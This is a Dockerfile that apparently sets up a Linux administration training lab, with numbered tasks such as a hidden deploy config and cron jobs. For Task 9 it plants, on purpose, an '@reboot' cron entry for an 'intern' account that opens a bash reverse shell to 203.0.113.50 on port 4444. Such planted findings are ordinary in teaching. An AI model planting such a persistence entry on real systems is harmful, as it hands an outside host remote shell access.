# Always a pinned tag (never latest); prefer images with arm64 builds.
FROM ubuntu:24.04

RUN apt-get update \
 && apt-get install -y --no-install-recommends cron \
 && rm -rf /var/lib/apt/lists/*

# Task 4: a config file the previous admin tucked away.
RUN mkdir -p /var/lib/harbor/.cache/old \
 && printf 'deploy_user=harbor\ndeploy_target=/root/site/public\n' > /var/lib/harbor/.cache/old/.deploy-settings.conf

# Task 8: root already has a cron job that must survive.
RUN echo '0 6 * * * /usr/bin/df -h > /var/log/disk-report.txt' | crontab -

# Task 9: an account with a cron job that calls out to an outside host.
RUN useradd -m -s /bin/bash intern \
 && printf '%s\n' '15 9 * * 1 /usr/bin/find /home/intern -name "*.tmp" -delete' \
      "@reboot /bin/bash -c 'bash -i >& /dev/tcp/203.0.113.50/4444 0>&1'" \
    | crontab -u intern -

RUN echo 'echo "Lab linux-101-capstone: tasks are in labs/linux-101-capstone/README.md. Check from the host with: ./lab check linux-101-capstone"' >> /root/.bashrc

WORKDIR /root
CMD ["sleep", "infinity"]
